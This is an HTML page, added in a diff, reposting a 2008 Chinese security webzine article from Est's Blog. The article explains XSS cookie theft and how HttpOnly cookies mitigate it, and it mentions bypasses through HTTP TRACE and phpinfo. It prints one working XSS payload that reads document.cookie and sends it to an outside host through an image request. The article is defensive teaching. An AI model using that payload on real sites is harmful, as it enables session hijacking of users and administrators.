@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>[转贴][XSS]利用httponly提升应用程序安全性 - Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="[转贴][XSS]利用httponly提升应用程序安全性" />
+
+      <link rel="canonical" href="https://blog.est.im/yo2/625610" />
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+
+
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">[转贴][XSS]利用httponly提升应用程序安全性</h2>
+    <p class="post-date">Posted <time datetime="2008-03-26T00:54:38+08:00">2008-03-26</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p><a href="https://groups.google.com/group/ph4nt0m/">ph4nt0m</a>社区出<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/de88b9a7472fa5b4/">webzine</a>了，顶啊！</p>
+<p>转一篇好文章，<a href="https://groups.google.com/group/ph4nt0m/browse_thread/thread/138221cb9405ac1e">利用httponly提升应用程序安全性</a></p>
+<p>&nbsp;==Ph4nt0m Security Team==</p>
+<p>Issue 0×01, Phile #0×06 of 0×06</p>
+<p>|=—————————————————————————=|<br>
+|=————-=[ 利用httponly提升应用程序安全性 ]=————–=|<br>
+|=—————————————————————————=|<br>
+|=—————————————————————————=|<br>
+|=——————–=[ By 剑心 ]=——————–=|<br>
+|=——————–=[ &lt;root_at_ph4nt0m_dot_org&gt; ]=——————–=|<br>
+|=—————————————————————————=|<br>
+|=—————————————————————————=|</p>
+<p>随着www服务的兴起，越来越多的应用程序转向了B/S结构，这样只需要一个浏览器就可<br>
+以访问各种各样的web服务，但是这样也越来越导致了越来越多的web安全问题。www服务依<br>
+赖于Htpp协议实现，Http是无状态的协议，所以为了在各个会话之间传递信息，就不可避免地<br>
+用到Cookie或者Session等技术来标记访问者的状态，而无论是Cookie还是Session，一般都<br>
+是利用Cookie来实现的（Session其实是在浏览器的Cookie里带了一个Token来标记，服务器<br>
+取得了这个Token并且检查合法性之后就把服务器上存储的对应的状态和浏览器绑定），这样<br>
+就不可避免地安全聚焦到了Cookie上面，只要获得这个Cookie，就可以取得别人的身份，这对<br>
+于入侵者是一件很美妙的事情，特别当获得的Cookie属于管理员等高权限身份者时，危害就<br>
+更大了。在各种web安全问题里，其中xss漏洞就因此显得格外危险。</p>
+<p>对于应用程序来说，一旦存在了xss漏洞就意味着别人可以在你的浏览器中执行任意的<br>
+js脚本，如果应用程序是开源的或者功能是公开的话，别人就可以利用ajax使用这些功能，但<br>
+是过程往往很烦琐，特别是想直接获得别人身份做随意浏览的话困难就更大。而对于不开源<br>
+的应用程序，譬如某些大型站点的web后台（web2.0一个显著的特征就是大量的交互，用户往<br>
+往需要跟后台的管理员交互，譬如Bug汇报，或者信息投递等等），尽管因为交互的存在可能存<br>
+在跨站脚本漏洞，但是因为对后台的不了解，无法构造完美的ajax代码来利用，即使可以用js<br>
+取得后台的代码并回传分析，但是过程同样烦琐而且不隐蔽。这个时候，利用xss漏洞获得<br>
+Cookie或者Session劫持就很有效了，具体分析应用程序的认证，然后使用某些技巧，甚至可<br>
+以即使对方退出程序也一样永久性获得对方的身份。</p>
+<p>那么如何获得Cookie或者Session劫持呢？在浏览器中的document对象中，就储存了<br>
+Cookie的信息，而利用js可以把这里面的Cookie给取出来，只要得到这个Cookie就可以拥有<br>
+别人的身份了。一个很典型的xss攻击语句如下：</p>
+<p>xss exp:</p>
+<p>url=document.top.location.href;<br>
+cookie=document.cookie;<br>
+c=new Image();<br>
+c.src="http://www.loveshell.net/c.php?c="+cookie+"&amp;u="+url;</p>
+<p>一些应用程序考虑到这个问题所在，所以可能会采取浏览器绑定技术，譬如将Cookie和浏览<br>
+器的User-agent绑定，一旦发现修改就认为Cookie失效。这种方法已经证明是无效的，因为<br>
+当入侵者偷得Cookie的同时他肯定已经同时获得了User-agent。还有另外一种比较严格的<br>
+是将Cookie和Remote-addr相绑定（其实就是和IP绑定，但是一些程序取得IP的方法有问题一<br>
+样导致饶过），但是这样就带来很差的用户体验，更换Ip是经常的事，譬如上班与家里就是2个<br>
+IP，所以这种方法往往也不给予采用。所以基于Cookie的攻击方式现在就非常流行，在一些<br>
+web 2.0站点很容易就取到应用程序的管理员身份。</p>
+<p>如何保障我们的敏感Cookie安全呢？通过上面的分析，一般的Cookie都是从document对<br>
+象中获得的，我们只要让敏感Cookie在浏览器document中不可见就行了。很幸运，现在浏览<br>
+器在设置Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一<br>
+旦这个HttpOnly被设置，你在浏览器的document对象中就看不到Cookie了，而浏览器在浏览<br>
+的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去（包括ajax的时候），应用程<br>
+序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对<br>
+于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安<br>
+全也保证了应用。关于HttpOnly说明可以参照<br>
+http://msdn2.microsoft.com/en-us/library/ms533046.aspx。</p>
+<p>给浏览器设置Cookie的头如下：</p>
+<p>Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;name&gt;=&lt;value&gt;]<br>
+[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]<br>
+[; path=&lt;some_path&gt;][; secure][; HttpOnly]</p>
+<p>以php为例，在php 5.2版本时就已经在Setcookie函数加入了对HttpOnly的支持，譬如</p>
+<p>&lt;?php</p>
+<p>setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);</p>
+<p>?&gt;</p>
+<p>就可以设置abc这个cookie，将其设置为HttpOnly，document将不可见这个Cookie。因为<br>
+setcookie函数本质就是个header，所以一样可以使用header来设置HttpOnly。然后再使用<br>
+document.cookie就可以看到已经取不到这个Cookie了。我们用这种方法来保护利例如<br>
+Sessionid，如一些用于认证的auth-cookie，就不用担心身份被人获得了，这对于一些后台程<br>
+序和webmail提升安全性的意义是重大的。再次使用上面的攻击手法时可以看到，已经不能<br>
+获取被我们设置为HttpOnly的敏感Cookie了。</p>
+<p>但是，也可以看到HttpOnly并不是万能的，首先它并不能解决xss的问题，仍然不能抵制<br>
+一些有耐心的黑客的攻击，也不能防止入侵者做ajax提交，甚至一些基于xss的proxy也出现<br>
+了，但是已经可以提高攻击的门槛了，起码xss攻击不是每个脚本小子都能完成的了，而且其<br>
+他的那些攻击手法因为一些环境和技术的限制，并不像Cookie窃取这种手法一样通用。</p>
+<p>HttpOnly也是可能利用一些漏洞或者配置Bypass的，关键问题是只要能取到浏览器发送<br>
+的Cookie头就可以了。譬如以前出现的Http Trace攻击就可以将你的Header里的Cookie回<br>
+显出来，利用ajax或者flash就可以完成这种攻击，这种手法也已经在ajax和flash中获得修<br>
+补。另外一个关于配置或者应用程序上可能Bypass的显著例子就是phpinfo，大家知道<br>
+phpinfo会将浏览器发送的http头回显出来，其中就包括我们保护的auth信息，而这个页面经<br>
+常存在在各种站点上，只要用ajax取phpinfo页面，取出header头对应的部分就可以获得<br>
+Cookie了。一些应用程序的不完善也可能导致header头的泄露，这种攻击方式对于basic验<br>
+证保护的页面一样可以攻击。</p>
+<p>HttpOnly在IE 6以上，Firefox较新版本都得到了比较好的支持，并且在如Hotmail等应<br>
+用程序里都有广泛的使用，并且已经是取得了比较好的安全效果。</p>
+<p>-EOF-</p>
+
+</article>
+
+
+<div class="comments">
+  <h2>Comments</h2>
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = 'estblog';
+    var disqus_identifier = 'yo2/625610';
+    var disqus_url = location.href;
+    (function() {
+    var dsq = document.createElement('script'); 
+
+    dsq.type = 'text/javascript';
+    dsq.defer = true;
+    dsq.src = '//estblog.disqus.com/embed.js';
+    (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the comments.</noscript>
+</div>    </main>
+<script src="/theme/js/core.js"></script>
+
+  </body>
+
+</html>
